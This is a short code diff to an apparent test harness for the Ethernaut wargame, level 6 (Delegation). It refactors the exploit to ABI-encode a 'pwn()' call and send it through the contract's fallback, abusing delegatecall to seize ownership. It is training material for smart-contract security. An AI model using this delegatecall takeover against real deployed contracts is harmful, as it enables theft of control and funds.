@@ -10,6 +10,12 @@ def test_lv06():
     exploit_lv06(contract)
     ethernaut.check_lv06(contract)
 
+def generate_payload() -> bytes:
+    binary_data = Abi.encode_with_signature("pwn()", [], [])
+    return binary_data
+
 def exploit_lv06(contract: Delegation):
+    # Attack vector: insecure function in implementation contract
     # Training: delegatecall, fallback(), invoking function by function selector 
-    contract.transact(b"\xdd\x36\x5b\x8b")
+    payload = generate_payload()
+    contract.transact(data=payload)
